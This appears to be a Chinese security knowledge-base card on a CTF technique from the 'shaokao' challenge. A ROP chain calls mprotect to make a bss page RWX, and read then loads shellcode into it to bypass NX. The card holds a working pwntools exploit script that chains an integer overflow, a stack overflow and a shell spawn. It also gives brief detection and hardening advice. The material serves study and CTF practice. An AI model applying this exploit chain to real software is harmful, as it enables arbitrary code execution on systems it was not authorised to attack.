---
id: binary-pwn-rop-mprotect-bss-rwx-read-shellcode
title: ROP 调 mprotect 把 bss 改 RWX 再 read 写入 shellcode：无程序内 mprotect 时的 NX 绕过
type: scenario
domain: binary
path: binary/pwn/rop
technique: rop-mprotect-bss-rwx-read-stage-shellcode
aliases:
- mprotect 利用
- ROP mprotect bss
- mprotect(0x4E8000,0x1000,7)
- ciscn2023 烧烤摊儿
- shaokao mprotect
- read 写入 shellcode
tags:
- pwn
- rop
- mprotect
- nx-bypass
- shellcode
- bss
- rwx
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V692
  verified_at: '2026-11-13T18:04:58+08:00'
  notes: 已对照原文与8张图逐张核对：图01/02 gdb+pwndbg 断 mprotect/free；图03 断在 __GI_mprotect（syscall-template.S）并显示 rdi/rsi/rdx 参数；图02 前后对照 vmmap：heap 页 rw-p→图04 rwxp，与文中演示代码一致；图05 main 菜单 pijiu/chuan/yue/vip/gaiming；图06 gaiming 的 char v5[32] 无长度 scanf 栈溢出；图07 pijiu 的 10*v9 与 money 整数判断、可被负数溢出绕过；图08 shellcode（31 字节 sh）发送后 ls 回显 shaokao/shaokao.py。卡内 ROP 链（pop rdi/rsi/rdx_rbx 布参→mprotect(0x4E8000,0x1000,7)→read(0,0x4E8000,0x100)→返回 0x4E8000 执行 shellcode）与原文 EXP 逐行一致；地址 read=0x457DC0/mprotect=0x458B00/pop_rdi=0x40264f/pop_rsi=0x40a67e/pop_rdx_rbx=0x4a404b 与原文一致。修正：原理段'与 glibc 的 mprotect 不同'改为'ROP 里调用的 mprotect 通常是 libc 的 syscall 包装（图03 断在 __GI_mprotect/syscall-template.S）'。dedup_review 核对成立：rop-mprotect-jmprsp-shellcode-transition（栈段改 RWX+jmp rsp，受限空间）与 binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page（程序自身已 mprotect+read）均与本卡'无程序内 mprotect、ROP 自行布参改 bss 再二次 read'不同链；两条 wikilink 目标均存在。原文为 CTF 题解、未标受影响版本，未设 affected_versions 正确。未验证点：PoC 未本机复跑；静态链接为按地址(0x4xxxxx)与 elf.symbols 注释推断。
---

## 一句话结论

当栈溢出能控制返回地址、但程序自身没有可用的 RWX 页/执行原语时，用 ROP 链调用 `mprotect(bss_addr, 0x1000, 7)` 把 bss 页改成可读可写可执行，再调用 `read(0, bss_addr, 0x100)` 从 stdin 读入任意 shellcode，最后返回到 bss 地址执行，即可在只开 NX 的 64 位程序上完成 ret2shellcode。

## 原理

- `mprotect(void *addr, size_t len, int prot)` 修改 `[addr, addr+len)` 的页表权限；`prot` 位值 PROT_READ=1、PROT_WRITE=2、PROT_EXEC=4，RWX 即 7。内核实现按 pgd/pmd/pte 逐级遍历：把用户 flags 转成页表 prot（`protection_map[newflags & 0xf]`），必要时拆分 vma（start/end/middle 三种 fixup），最后 `change_protection` 改写页表项并刷新 TLB。addr 必须页对齐、len 向上取整到页；合法 prot 只有低三位（其余位返回 EINVAL）。
- NX 是页级属性：栈不可执行不代表 bss 不可执行，只要用 mprotect 把目标页设为 PROT_EXEC，写入其中的机器码即可运行。文中演示 `malloc(4096)` 后对页首 `mprotect(page, 4096, 7)`，pwndbg `vmmap` 中该 heap 页从 rw-p 变为 rwxp。
- 利用前提是拿到三个参数寄存器（x86-64：rdi=addr、rsi=len、rdx=prot），用 `pop rdi; ret`、`pop rsi; ret`、`pop rdx; pop rbx; ret`（或 ret2csu）布参后 call mprotect；再用同样方式调用 read 把 shellcode 读进该页；read 的返回地址直接填 bss 地址，read 返回即跳入 shellcode。
- ROP 里调用的 mprotect 通常是 libc 的 syscall 包装（图 03 断在 `__GI_mprotect` / `syscall-template.S`）；若程序只有 syscall 指令也可自行 `mov rax,10; syscall`（x86-64 系统调用号 10）。
- 选 bss 而不是栈：栈页 mprotect 后还需要 `jmp rsp` 一类跳转且长度受溢出空间限制；bss 地址固定、空间大、可直接用 read 第二次输入任意长度 shellcode。

## 触发条件

- 64 位 ELF，NX 开启、无 PIE 或已泄漏基址（bss/函数/gadget 地址固定）；
- 存在可控返回地址的栈溢出（本例 gaiming 的 `scanf("%s")` 写 char[32] 无长度限制、无 canary）；
- 能控制连续 ROP 空间（或可分段 read 续链）；程序内有 `pop rdi/rsi/rdx` 等 gadget 与 mprotect、read 的可调用地址（plt/libc/静态链接符号）;
- 目标 bss 页可写（常规 .bss 满足）且大小足够（0x1000 一页）。

## 利用步骤

1. checksec 确认 NX/PIE；IDA 找溢出点与偏移（本例 `char v5[32]`，payload 先 `'a'*0x20 + p64(0)` 覆盖 saved rbp）。
2. 找 gadget：`pop rdi; ret`、`pop rsi; ret`、`pop rdx; pop rbx; ret`，以及 mprotect/read 的地址（题中静态链接，如 mprotect=0x458B00、read=0x457DC0）。
3. 构造链：`mprotect(0x4E8000, 0x1000, 7)` → `read(0, 0x4E8000, 0x100)` → 返回地址 0x4E8000。
4. 先发送 ROP payload 触发溢出；程序执行 mprotect 后 bss 页变 RWX，read 等待第二段输入。
5. 发送 shellcode（`asm(shellcraft.sh())`），read 返回后跳到 0x4E8000 执行，getshell。
6. 若第一次输入后 read 未触发或提前返回，检查栈对齐、gadget 副作用（pop rdx;pop rbx 多消耗一个槽）与 bss 地址是否页对齐。

## PoC

```python
from pwn import *
context(arch='amd64', log_level='debug')
io = process('./shaokao')
read = 0x457DC0; mprotect = 0x458B00
pop_rdi = 0x40264f; pop_rsi = 0x40a67e; pop_rdx_rbx = 0x4a404b

# 整数溢出买下摊位后进入 gaiming 的栈溢出
sl(str(1)); sl(str(1)); sl(str(-1000000)); ru("> "); sl(str(4)); ru("> "); sl(str(5)); ru("请赐名：")

payload  = b'a' * 0x20 + p64(0)
payload += p64(pop_rdi) + p64(0x4E8000) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_rbx) + p64(7) + p64(0) + p64(mprotect)
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(0x4E8000) + p64(pop_rdx_rbx) + p64(0x100) + p64(0) + p64(read)
payload += p64(0x4E8000)
sl(payload)
sl(asm(shellcraft.sh()))
io.interactive()
```

## 变体与关联

- 程序自身已 mprotect bss 时只需写 shellcode 并跳转（[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]）；本卡是在无该调用时由 ROP 自行布参。
- 把栈页改 RWX 再 `jmp rsp` 的变体见 [[rop-mprotect-jmprsp-shellcode-transition]]；seccomp 场景把 shellcode 换成 ORW。
- 无足够 gadget 时用 ret2csu/`pop rdx; pop r12; ret` 或 libc 中的 gadget；32 位用 `int 0x80` 的 mprotect（syscall 125）。
- 若 bss 页已被其他映射占用或不可写，可换 mmap 申请 RWX 页（`mmap(0,0x1000,7,0x22,-1,0)`）。

## 检测与防御

- 加固：NX/ASLR/PIE/Canary 全开，Full RELRO；避免静态链接（gadget 丰富）与固定 bss 地址。
- 检测：进程 vmmap 中出现由 bss 页变成的 rwxp 段、mprotect(PROT_EXEC) 调用、read 后立即跳转非代码段（返回地址落在 .bss）。
- 防御：W^X 策略/PaX 禁止匿名可写页执行；seccomp 限制 mprotect/read 组合。
